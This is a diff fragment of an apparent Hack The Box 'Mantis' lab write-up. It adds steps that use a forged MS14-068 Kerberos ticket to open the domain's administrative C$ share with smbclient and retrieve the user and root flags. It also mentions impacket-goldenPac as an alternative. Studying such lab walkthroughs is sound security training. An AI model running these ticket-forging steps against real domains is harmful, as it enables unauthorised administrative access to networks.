@@ -283,6 +283,17 @@ running the command i was able to find a copy of `ms14-068.py` [here-PyKEK](http
 python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
 ```
 
+
+```sh
+ cp TGT_james@htb.local.ccache /tmp/krb5cc_0
+```
+
+```
+smbclient -W htb.local //mantis/c$ -k
+```
+
+and now dir and get flags from `get Users\james\desktop\user.txt` and `get Users\administrator\desktop\root.txt`
+
 ### OR
 
 The [MS14-068](https://www.trustedsec.com/blog/ms14-068-full-compromise-step-step/) exploit targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Lucky for us, [impacket-goldenPac](https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py) can be used to automatically exploit the vulnerability.Impacket has a script
